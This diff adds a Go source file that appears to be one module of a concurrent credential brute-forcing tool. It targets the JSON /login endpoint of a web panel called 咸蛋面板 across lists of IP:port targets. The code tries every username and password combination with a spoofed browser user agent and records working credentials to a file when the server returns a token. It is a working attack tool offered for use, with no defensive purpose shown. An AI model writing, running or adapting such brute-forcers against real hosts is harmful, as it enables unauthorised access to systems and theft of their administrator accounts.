@@ -1,0 +1,79 @@
+// Handler: 咸蛋面板 (模式 4)
+// POST /login — application/json
+// 响应: {"success": true, "data": {"token": "..."}}
+
+import (
+	"context"
+	"encoding/json"
+	"fmt"
+	"io"
+	"net/http"
+	"strings"
+	"time"
+)
+
+func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
+	client := &http.Client{}
+	payload := map[string]string{
+		"username": username,
+		"password": password,
+	}
+	jsonPayload, _ := json.Marshal(payload)
+	req, err := http.NewRequest("POST", url, strings.NewReader(string(jsonPayload)))
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
+	req.Header.Set("Accept", "application/json, text/plain, */*")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36")
+	req = req.WithContext(ctx)
+	return client.Do(req)
+}
+
+func processIP(ipPort string, file *os.File, usernames []string, passwords []string) {
+	defer wg.Done()
+	semaphore <- struct{}{}
+	defer func() { <-semaphore }()
+
+	// 归一化: URL → host:port
+	ipPort = normalizeTarget(ipPort)
+
+	parts := strings.Split(ipPort, ":")
+	if len(parts) != 2 {
+		atomic.AddInt64(&completedCount, 1)
+		return
+	}
+	ip, port := parts[0], parts[1]
+	url := fmt.Sprintf("http://%s:%s/login", ip, port)
+
+	for _, username := range usernames {
+		for _, password := range passwords {
+			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
+			resp, err := postRequest(ctx, url, username, password)
+			cancel()
+
+			if err != nil || resp.StatusCode != 200 {
+				if resp != nil {
+					resp.Body.Close()
+				}
+				continue
+			}
+
+			body, _ := io.ReadAll(resp.Body)
+			resp.Body.Close()
+			var responseData map[string]interface{}
+			if err := json.Unmarshal(body, &responseData); err == nil {
+				if success, ok := responseData["success"].(bool); ok && success {
+					if data, ok := responseData["data"].(map[string]interface{}); ok {
+						if token, exists := data["token"]; exists && token != "" {
+							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s", ip, port, username, password))
+							atomic.AddInt64(&completedCount, 1)
+							return
+						}
+					}
+				}
+			}
+		}
+	}
+	atomic.AddInt64(&completedCount, 1)
+}
